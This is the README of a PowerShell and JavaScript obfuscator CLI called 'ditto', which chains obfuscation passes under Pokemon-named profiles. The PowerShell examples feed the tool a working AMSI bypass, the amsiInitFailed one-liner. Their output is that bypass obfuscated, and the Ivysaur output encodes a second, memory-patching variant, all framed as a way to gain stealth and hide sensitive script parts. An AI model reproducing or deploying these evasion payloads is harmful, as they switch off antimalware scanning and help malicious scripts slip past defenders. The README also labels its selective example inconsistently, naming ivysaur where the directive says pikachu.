# ditto

<div align="center">
    <img src="img/ditto.png" width="10%"></img>
<br />
 <strong>
   Powershell Obfuscator
 </strong>

</div>

<br />

Ditto is a Powershell and JavaScript obfuscator base
on [tree-sitter-powershell](https://github.com/airbus-cert/tree-sitter-powershell)
and [tree-sitter-javascript](https://github.com/tree-sitter/tree-sitter-javascript).

## **Command Line Usage**

### **Basic Command Structure**

ditto-cli [options]

### **CLI Arguments & Options**

| Short Option  | Long Option           | Description                                                                 |
|:--------------|:----------------------|:----------------------------------------------------------------------------|
| -h            | --help                | Display help information and exit.                                          |
| -v            | --version             | Display version information and exit.                                       |
| -p <PATH>     | --path <PATH>         | Path to the script file to process.                                         |
| -i <IMPOSTOR> | --impostor <IMPOSTOR> | Impostor profile to use for obfuscation (case-insensitive).                 |
| -L            | --list                | List all available impostor profiles.                                       |
| -t            | --time                | Show computation time taken for the obfuscation process.                    |
| -d <LEVEL>    | --debug-level <LEVEL> | Debug level. Options: off, error, warn, info, debug, trace (Default: info). |
| -q            | --quiet               | Only output the final obfuscated script, suppressing all other logs.        |

## **Supported Languages & Impostors**

Each language comes equipped with distinctive, Pokemon-themed **Impostors**. An impostor is a named recipe that chains
several obfuscation passes together. Each one favours a different mix of techniques, so the same script obfuscated by two
impostors looks nothing alike. Pick the one whose trade-off (stealth, size, readability, reversing difficulty) fits your
needs.

### **PowerShell**

| Impostor      | What it does                                                                                                                                                                                                          |
|:--------------|:--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| **Pikachu**   | The all-rounder mascot. Converts literals to static strings, rewrites cmdlets and type members as strings, Base64-encodes strings, splits integers with inline modulo/hexlify, and renames variables randomly. A balanced default. |
| **Bulbasaur** | Entry-level starter. String/cmdlet/member rewriting, Base64 encoding, random variable names, and integers rebuilt via a reversed-modulo trick. Light and readable-ish.                                                |
| **Ivysaur**   | Bulbasaur's evolution. Same base recipe but variables are named after PowerShell verbs (`${Set-...}`, `${Add-...}`, `${Remove-...}`) to blend in with legitimate code, plus inline hexlify and modulo-reverse integers. |
| **Charizard** | The heavy hitter. Static strings, Base64, randomized inline modulo/hexlify, member-as-string, modulo-reverse integers, and randomized variable names and types stacked together for aggressive obfuscation.           |
| **Alakazam**  | The math brain. Pre-computes every boolean and integer into arithmetic expressions, breaks invocation expressions apart, and turns cmdlets, members and types into strings. Produces dense, expression-heavy output.  |
| **Onix**      | The array specialist. Stores tokens in constant arrays, shuffles them, hexlifies via `foreach`, and rebuilds every integer through XOR/add arithmetic evaluated at runtime.                                            |
| **Eevee**     | The renamer. Randomly renames all functions, parameters and variables, rewrites cmdlets/members as strings, and assigns UUID-style and verb-style names with wildcard masking. Focused on identifier obfuscation.     |
| **Ditto**     | The mimic — a meta-impostor. Instead of transforming the whole file, it scans the source for `# ditto(<engine>)` comments and applies the named engine **only to the statement that immediately follows** the comment. This lets you mix impostors within a single script. See [Selective obfuscation with Ditto](#selective-obfuscation-with-ditto). |

### **JavaScript**

| Impostor       | What it does                                                                                                                                                                                                     |
|:---------------|:---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| **Tinkatuff**  | The well-rounded default. Rewrites member accesses as subscripts, occasionally converts expressions to `switch`/`if-else`, turns numbers into math expressions, and encodes/splits/escapes strings and identifiers. Good balance of coverage and size. |
| **Unown**      | The symbol cipher. Encodes numbers, strings, booleans, specials and default objects with [JSFuck](https://jsfuck.com/)-style tricks and renames identifiers using only `$` and `_`. Output is nearly unreadable. |
| **Metagross**  | *"Wait, it's all numbers?"* Turns strings into `fromCharCode`, rewrites every number as an expression, and renames all identifiers to number-like names. The output is almost entirely digits.                    |
| **Wailord**    | The whale. Produces a **massive** output (average expansion ratio ~4643x). Only use it on small scripts — it stacks bubble-named identifiers, string splitting, JSFuck numbers and array transforms.              |
| **Clefable**   | The gambler. Randomly picks among *all* available passes so you get a comparatively "small" output that still carries every kind of protection. A reverser has to handle every possible pass. Because passes are chosen at random and can interfere, you may need to run it a few times. |
| **Cofagrigus** | The tomb. Renames identifiers with Egyptian-hieroglyph names, encodes strings, rewrites numbers as expressions, and applies string/number "curse" transforms. Eerie, dense, and hard to read.                     |

List all available impostors directly from your shell:

```shell
ditto-cli --list
```

Don't hesitate to add yours ! And then you can invoke the one you want.

## **Examples**

### **PowerShell Transformation (Ivysaur Impostor)**

**Original PowerShell Script:**

```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed', 'NonPublic,Static').SetValue($null, $true)
```

**Obfuscation Command:**
```shell
ditto-cli --path test.ps1 --impostor ivysaur
```

**Obfuscated Output:**

```powershell
${Set-mK6} = 1; ${Add-xjQ} = 12; ${Remove-ScJ} = 8; ${Find-V7v} = 7; ${Get-wCX} = 4; ${Set-JEp} = 9; ${Add-3eV} = 16; ${Remove-pIQ} = 52; ${Find-OHR} = 24; ${Get-r4u} = 9076; ${Set-t49} = 89; ${Add-Qvs} = 87; ${Remove-qwO} = 49; ${Find-SMs} = 122; ${Get-wUj} = 97; ${Set-Ox3} = 86; ${Add-VQ5} = 78; ${Remove-EeM} = 108; ${Find-gzG} = 99; ${Get-LGX} = 51; ${Set-X5g} = 112; ${Add-GD5} = 98; ${Remove-aho} = 50; ${Find-3Zs} = 61; ${Get-ihU} = 85; ${Set-nKM} = 100; ${Add-GWd} = 71; ${Remove-Tvm} = 116; ${Find-7ba} = 76; ${Get-oeb} = 107; ${Set-Vxt} = 104; ${Add-rmz} = 109; ${Remove-Fsk} = 70; ${Find-jz5} = 110; ${Get-2TD} = 90; ${Set-TIQ} = 81; ${Add-Ru7} = 117; ${Remove-4HR} = 88; ${Find-T8S} = 48; ${Get-n8s} = 118; ${Set-mmg} = 105; ${Add-PZ1} = 53; ${Remove-xzI} = 66; ${Find-LRq} = 82; ${Get-MFU} = 72; ${Set-W0e} = 77; ${Add-bvf} = 84; ${Remove-3nx} = 57; ${Find-e43} = 106; ${Get-88G} = 119; $f8XP9 = [System.Runtime.InteropServices.Marshal]; $ifXoW = [Ref]; $lgnLf = [System.Text.Encoding]; $Knr3E = [System.Convert]; ${Set-cfudY9iG} = -join 'labolGHcollA'[-${Set-mK6}..-${Add-xjQ}]; ${Add-q3RPK0Xu} = -join 'ylbmessA'[-${Set-mK6}..-${Remove-ScJ}]; ${Remove-50AhxHbh} = -join 'epyTteG'[-${Set-mK6}..-${Find-V7v}]; ${Find-VOSaUhQS} = -join '8FTU'[-${Set-mK6}..-${Get-wCX}]; ${Get-w0xewYE7} = -join 'gnirtSteG'[-${Set-mK6}..-${Set-JEp}]; ${Set-2rZQYi7O} = -join 'gnirtS46esaBmorF'[-${Set-mK6}..-${Add-3eV}]; ${Add-nottCZwE} = -join '=MHbpRXVpNXbB5ibvlGdh12b0VXQuQnbl1WZnFmbh1kLtVGdzl3U'[-${Set-mK6}..-${Remove-pIQ}]; ${Remove-b45sz9Zn} = -join 'dleiFteG'[-${Set-mK6}..-${Remove-ScJ}]; ${Find-mUeEbv73} = -join '==wYpRXY0NFLjlGbiVHUu9mT'[-${Set-mK6}..-${Find-OHR}]; ${Get-hbkDceRb} = -join 'eulaVteS'[-${Set-mK6}..-${Remove-ScJ}]; ${Set-1zjqeqJt} = -join '=QHelRnbvNUaz1WY'[-${Set-mK6}..-${Add-3eV}]; $mem = $f8XP9::${Set-cfudY9iG}(${Get-r4u});$ifXoW.${Add-q3RPK0Xu}.${Remove-50AhxHbh}(($lgnLf::${Find-VOSaUhQS}.${Get-w0xewYE7}($Knr3E::${Set-2rZQYi7O}(${Add-nottCZwE})))).${Remove-b45sz9Zn}(($lgnLf::${Find-VOSaUhQS}.${Get-w0xewYE7}($Knr3E::${Set-2rZQYi7O}(([char]${Set-t49} + [char]${Add-Qvs} + [char]${Remove-qwO} + [char]${Find-SMs} + [char]${Get-wUj} + [char]${Set-Ox3} + [char]${Add-VQ5} + [char]${Remove-EeM} + [char]${Find-gzG} + [char]${Get-LGX} + [char]${Add-VQ5} + [char]${Set-X5g} + [char]${Add-GD5} + [char]${Remove-aho} + [char]${Remove-pIQ} + [char]${Find-3Zs})))), ($lgnLf::${Find-VOSaUhQS}.${Get-w0xewYE7}($Knr3E::${Set-2rZQYi7O}(${Find-mUeEbv73})))).${Get-hbkDceRb}($null, $null);$ifXoW.${Add-q3RPK0Xu}.${Remove-50AhxHbh}(($lgnLf::${Find-VOSaUhQS}.${Get-w0xewYE7}($Knr3E::${Set-2rZQYi7O}(([char]${Get-ihU} + [char]${Get-LGX} + [char]${Remove-EeM} + [char]${Find-SMs} + [char]${Set-nKM} + [char]${Add-GWd} + [char]${Set-Ox3} + [char]${Remove-Tvm} + [char]${Find-7ba} + [char]${Get-oeb} + [char]${Remove-qwO} + [char]${Set-Vxt} + [char]${Add-GD5} + [char]${Add-rmz} + [char]${Remove-Fsk} + [char]${Find-jz5} + [char]${Get-2TD} + [char]${Add-Qvs} + [char]${Remove-qwO} + [char]${Remove-EeM} + [char]${Add-GD5} + [char]${Find-jz5} + [char]${Set-TIQ} + [char]${Add-Ru7} + [char]${Set-TIQ} + [char]${Remove-4HR} + [char]${Set-Ox3} + [char]${Find-T8S} + [char]${Add-GD5} + [char]${Remove-aho} + [char]${Remove-qwO} + [char]${Set-Vxt} + [char]${Set-nKM} + [char]${Add-GWd} + [char]${Remove-EeM} + [char]${Get-n8s} + [char]${Add-GD5} + [char]${Set-mmg} + [char]${Add-PZ1} + [char]${Remove-xzI} + [char]${Add-GD5} + [char]${Remove-4HR} + [char]${Add-VQ5} + [char]${Set-X5g} + [char]${Set-Ox3} + [char]${Remove-4HR} + [char]${Find-LRq} + [char]${Set-X5g} + [char]${Add-GD5} + [char]${Get-MFU} + [char]${Set-W0e} + [char]${Find-3Zs}))))).${Remove-b45sz9Zn}(($lgnLf::${Find-VOSaUhQS}.${Get-w0xewYE7}($Knr3E::${Set-2rZQYi7O}(${Set-1zjqeqJt}))), ($lgnLf::${Find-VOSaUhQS}.${Get-w0xewYE7}($Knr3E::${Set-2rZQYi7O}(([char]${Add-bvf} + [char]${Add-rmz} + [char]${Remove-3nx} + [char]${Add-Ru7} + [char]${Get-ihU} + [char]${Get-MFU} + [char]${Set-Ox3} + [char]${Set-mmg} + [char]${Add-GD5} + [char]${Add-GWd} + [char]${Remove-EeM} + [char]${Find-e43} + [char]${Find-7ba} + [char]${Remove-Fsk} + [char]${Add-VQ5} + [char]${Find-T8S} + [char]${Set-t49} + [char]${Remove-4HR} + [char]${Find-LRq} + [char]${Set-X5g} + [char]${Set-t49} + [char]${Get-88G} + [char]${Find-3Zs} + [char]${Find-3Zs}))))).${Get-hbkDceRb}($null, [IntPtr]$mem)
```

### **JavaScript Transformation (Tinkatuff Impostor)**

**Original JS Script:**

```js
function greet(user) {
    console.log("Hello, " + user + "!");
}

greet("World");
```

**Obfuscation Command:**
```shell
ditto-cli --path test.js --impostor Tinkatuff
```

**Obfuscated Output:**

```js
function \u0067\u0072\u0065e\u0074(\u0075\u0073\u0065\u0072) {
    \u0063\u006F\u006E\u0073\u006Fle[\u0061\u0074\u006F\u0062((\u0053\u0074r\u0069\u006E\u0067('\x62\u0047') + '\x39\x52\u{00000039}h\u0041\u0062\u{000037}\u003739\x6E\u{0000033}\u0036n'.\u0072\u0065\u0070\u006C\u0061c\u0065\u0041l\u006C(/R9hAb\d{3}9n36/g, '')))](de\u0063\u006F\u0064\u0065\u0055\u0052I\u0043o\u006Dp\u006F\u006E\u0065n\u0074((\u0053\u0074\u0072\u0069\u006E\u0067.\u0072\u0061\u0077`%48` + '\u{00000025}\x0D\n'.\u0074\u0072im\u0045\u006E\u0064() + ['6\u{000035}', '\x25'].\u006Aoi\u006E('') + '\x36'.\u0074\u006F\u0053\u0074\u0072i\u006E\u0067() + '\u{0000043}%\u0036' + ''.\u006C\u0069n\u006B('C\u0025\x36').\u0073\u006C\u0069\u0063e(9, -6) + new \u0053\u0074\u0072\u0069n\u0067('\u0046\u0025').\u0076\u0061\u006C\u0075\u0065O\u0066() + '\r\u{000000A}\u0032C\x25\u{00000D}\t'.\u0074\u0072\u0069m() + '20'.\u0074r\u0069m\u0045\u006E\u0064())) + \u0075\u0073\u0065\u0072 + \u0064\u0065c\u006F\u0064\u0065\u0055\u0052I((\u0053\u0074r\u0069n\u0067.r\u0061\u0077`%` + '\n\u0020\u{00000020}\x321'.\u0074\u0072\u0069m\u0053tar\u0074())));
}

\u0067\u0072eet(\u0064\u0065c\u006F\u0064\u0065\u0055RI\u0043\u006Fm\u0070\u006Fn\u0065\u006E\u0074(('\u{0000025}\u{0000035}' + '\u{00000037}\u{00025}\n\x0A\u0009\u000A'.t\u0072\u0069\u006D\u0045n\u0064() + '6\u0046%' + \u0053\u0074\u0072\u0069\u006E\u0067.\u0066\u0072\u006F\u006DCh\u0061\u0072\u0043\u006Fd\u0065(55) + '\u{000032}'.\u0062\u0069\u0067().sl\u0069\u0063\u0065(5, -6) + \u0053\u0074\u0072\u0069\u006E\u0067.\u0072\u0061w`%6` + '\u{000043}' + \u0053\u0074\u0072\u0069\u006E\u0067.\u0072\u0061\u0077`%6` + '4')));
```

### **Selective obfuscation with Ditto**

The **Ditto** impostor doesn't obfuscate the whole file. It looks for directive comments of the form `# ditto(<engine>)`
and applies the named engine to the single statement right after the comment. Everything else is left untouched, and the
directive comment itself is removed from the output. This is handy when you only want to hide sensitive parts of a script,
or mix several engines in one file.

**Original PowerShell Script:**

```powershell
Write-Host "starting"

# ditto(pikachu)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed', 'NonPublic,Static').SetValue($null, $true)

Write-Host "done"
```

**Obfuscation Command:**
```shell
ditto-cli --path test.ps1 --impostor ditto
```

**Obfuscated Output:**

```powershell
Write-Host "starting"

$WRL6c=109;$DDjV=56;$pjWqV8=86;$r8cnDa=108;$wAD=101;$xtYSTM=50;$IHnFn=51;$787F0=122;$qWcmH0=65;$LgjuIE=77;$ial=52;$kVfXz=103;$gI9H6=104;$E3qM=97;$4Tr4=105;$empCP=117;$KA4XB=89;$TeXxjO=53;$t7IyYw=54;$ogg=114;$pDD=57;$dQXaf=81;$iTBnE=61;$IBf=48;$GUy=71;$cbVM=110;$biGF=85;$Z7Pn=106;$vcF=87;$oqzy3=72;$37C=118;$suPWLN=112;$1Ywq0M=83;$KI9h=119;$B3fd=70;$IScvzV=90;$oveAB=88;$p6TMv=84;$zj7E=98;$wUzL=111;$ToF=107;$Sd0Ozk=100;$AtZ=49;$qeyQOw=121;$NAX=115;$QsySk=82;$Zqk=66;$QYl36=78;$LHhAV=76;$DJp=116;$Rz89sj=([char]$KA4XB+[char]$vcF+[char]$AtZ+[char]$787F0+[char]$E3qM+[char]$biGF+[char]$r8cnDa+[char]$empCP+[char]$E3qM+[char]$oveAB+[char]$QsySk+[char]$GUy+[char]$KA4XB+[char]$vcF+[char]$r8cnDa+[char]$NAX+[char]$IScvzV+[char]$vcF+[char]$dQXaf+[char]$iTBnE);$TNP=([char]$qWcmH0+[char]$NAX+[char]$NAX+[char]$wAD+[char]$WRL6c+[char]$zj7E+[char]$r8cnDa+[char]$qeyQOw);$rF2B=([char]$biGF+[char]$p6TMv+[char]$B3fd+[char]$DDjV);$0xJaev=([char]$GUy+[char]$wAD+[char]$DJp+[char]$p6TMv+[char]$qeyQOw+[char]$suPWLN+[char]$wAD);$vpg=([char]$B3fd+[char]$ogg+[char]$wUzL+[char]$WRL6c+[char]$Zqk+[char]$E3qM+[char]$NAX+[char]$wAD+[char]$t7IyYw+[char]$ial+[char]$1Ywq0M+[char]$DJp+[char]$ogg+[char]$4Tr4+[char]$cbVM+[char]$kVfXz);$ISW=([char]$p6TMv+[char]$WRL6c+[char]$pDD+[char]$empCP+[char]$biGF+[char]$oqzy3+[char]$pjWqV8+[char]$4Tr4+[char]$zj7E+[char]$GUy+[char]$r8cnDa+[char]$Z7Pn+[char]$LHhAV+[char]$B3fd+[char]$QYl36+[char]$IBf+[char]$KA4XB+[char]$oveAB+[char]$QsySk+[char]$suPWLN+[char]$KA4XB+[char]$KI9h+[char]$iTBnE+[char]$iTBnE);$wiiSIm=([char]$biGF+[char]$IHnFn+[char]$r8cnDa+[char]$787F0+[char]$Sd0Ozk+[char]$GUy+[char]$pjWqV8+[char]$DJp+[char]$LHhAV+[char]$ToF+[char]$AtZ+[char]$gI9H6+[char]$zj7E+[char]$WRL6c+[char]$B3fd+[char]$cbVM+[char]$IScvzV+[char]$vcF+[char]$AtZ+[char]$r8cnDa+[char]$zj7E+[char]$cbVM+[char]$dQXaf+[char]$empCP+[char]$dQXaf+[char]$oveAB+[char]$pjWqV8+[char]$IBf+[char]$zj7E+[char]$xtYSTM+[char]$AtZ+[char]$gI9H6+[char]$Sd0Ozk+[char]$GUy+[char]$r8cnDa+[char]$37C+[char]$zj7E+[char]$4Tr4+[char]$TeXxjO+[char]$Zqk+[char]$zj7E+[char]$oveAB+[char]$QYl36+[char]$suPWLN+[char]$pjWqV8+[char]$oveAB+[char]$QsySk+[char]$suPWLN+[char]$zj7E+[char]$oqzy3+[char]$LgjuIE+[char]$iTBnE);$en3=([char]$GUy+[char]$wAD+[char]$DJp+[char]$B3fd+[char]$4Tr4+[char]$wAD+[char]$r8cnDa+[char]$Sd0Ozk);$rlIe=([char]$1Ywq0M+[char]$wAD+[char]$DJp+[char]$pjWqV8+[char]$E3qM+[char]$r8cnDa+[char]$empCP+[char]$wAD);$lmq=([char]$GUy+[char]$wAD+[char]$DJp+[char]$1Ywq0M+[char]$DJp+[char]$ogg+[char]$4Tr4+[char]$cbVM+[char]$kVfXz);${NBX}=[Ref];${Q6V}=[System.Text.Encoding];${93J9}=[System.Convert];${NBX}.$TNP.$0xJaev((${Q6V}::$rF2B.$lmq(${93J9}::$vpg($wiiSIm)))).$en3((${Q6V}::$rF2B.$lmq(${93J9}::$vpg($Rz89sj))), (${Q6V}::$rF2B.$lmq(${93J9}::$vpg($ISW)))).$rlIe($null, $true)

Write-Host "done"
```

Only the line following `# ditto(ivysaur)` is obfuscated (with the Ivysaur engine); the two `Write-Host` calls stay as-is.

## Building from Source
1. Clone the repository
2. Install [rust with cargo](https://rust-lang.org/tools/install)
3. Build the project
```shell
cargo build --release --bin ditto-cli  
```
After building, you'll find the binary in `./target/release/`

## Running from sources
1. Clone the repository
2. Install [rust with cargo](https://rust-lang.org/tools/install)
3. Run the project
```shell
cargo run --release --bin ditto-cli -- {args goes here}
```
